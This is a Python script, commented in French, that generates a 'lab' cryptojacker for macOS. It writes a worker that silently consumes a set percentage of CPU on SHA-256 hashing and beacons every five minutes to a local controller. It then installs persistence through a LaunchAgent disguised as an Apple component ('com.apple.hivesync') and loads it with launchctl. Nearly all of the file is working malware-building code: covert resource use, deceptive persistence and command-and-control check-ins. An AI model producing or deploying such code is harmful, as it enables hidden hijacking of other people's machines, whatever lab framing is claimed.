#!/usr/bin/env python3
# language: Python 3, file: ruche_payload.py, target: macOS (generateur de cryptojacker lab)
# Genere un payload mineur discret + persistance LaunchAgent (machine autorisee)
# Usage: python3 ruche_payload.py [profile_cpu_pct]
import os, sys

PCT = int(sys.argv[1]) if len(sys.argv) > 1 else 20
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties")
os.makedirs(OUT, exist_ok=True)

MINER = f'''#!/usr/bin/env python3
# cryptojacker de lab - consomme ~{PCT}% CPU en hashes SHA-256 (aucun pool reel)
import hashlib, time, os, signal
PCT = {PCT}
def burn():
    # cycles de {PCT}% : burn {PCT}ms, sleep le reste par tranche de 100 ms
    n = 0
    t0 = time.time()
    while True:
        hashlib.sha256(str(n).encode()).digest()
        n += 1
        if time.time() - t0 > PCT / 100:
            time.sleep((100 - PCT) / 100)
            t0 = time.time()
import threading
threading.Thread(target=burn, daemon=True).start()
# thread de check-in discret vers le maitre de la ruche (lab: localhost)
import urllib.request
while True:
    try:
        urllib.request.urlopen("http://127.0.0.1:8090/?id=ruche-worker", timeout=5)
    except Exception:
        pass
    time.sleep(300)
'''
pl = os.path.join(OUT, "ruche_worker.py")
open(pl, "w").write(MINER)
os.chmod(pl, 0o755)

PLIST = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.hivesync</string>
  <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>{pl}</string></array>
  <key>RunAtLoad</key><true/>
  <key>Nice</key><integer>10</integer>
</dict></plist>
'''
plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.hivesync.plist")
open(plist, "w").write(PLIST)
os.system(f"launchctl load '{plist}'")
print(f"[OK] ruche deploiee : {pl}")
print(f"     persistance : {plist} (Nice 10 = priorite basse, {PCT}% CPU)")
print(f"     arret : launchctl unload {plist} && rm {plist} {pl}")
